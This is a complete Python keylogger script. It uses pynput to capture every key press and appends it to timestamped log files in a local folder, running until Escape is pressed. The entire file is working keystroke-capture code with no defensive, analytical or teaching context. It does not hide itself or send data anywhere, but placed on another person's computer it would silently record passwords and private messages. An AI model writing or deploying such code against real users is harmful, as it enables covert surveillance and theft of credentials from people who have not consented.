import pynput.keyboard
from datetime import datetime
import time
import os



# Define a function to handle key presses
def on_press(key):
    global last_press_time
    # Open a file to write the key presses
    with open(f"keyloggerLog/keylogger_{datetime.now().strftime('%Y%m%d%H%M')}.txt", "a") as f:
        # Get the current time
        current_time = time.time()
        # If the time since the last key press is greater than _ seconds, write a new line
        if current_time - last_press_time > 8:
            f.write('\n')
            last_press_time = current_time
        # Write the key press to the file
        f.write(str(key))

# Define a function to handle key releases
def on_release(key):
    # If the escape key is pressed, stop the listener
    if key == pynput.keyboard.Key.esc:
        return False

if not os.path.exists("keyloggerLog"):
    os.makedirs("keyloggerLog")

# Set the last press time to 0
last_press_time = 0

# Create a listener for key presses and releases
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Start the listener
    listener.join()
